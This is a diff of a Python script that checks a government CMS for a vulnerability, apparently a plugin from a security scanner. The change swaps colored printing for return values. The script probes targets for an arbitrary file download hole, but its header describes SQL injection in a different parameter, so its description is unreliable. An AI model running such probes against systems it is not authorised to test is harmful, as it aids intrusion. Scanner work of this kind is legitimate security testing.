@@ -8,8 +8,8 @@ description: 文件/coupon/s.php中,参数fids存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class zf_cms_FileDownload_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class zf_cms_FileDownload_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
-                cprint("[+]存在某政府通用任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在某政府通用任意文件下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = zf_cms_FileDownload_BaseVerify(sys.argv[1])
     testVuln.run()
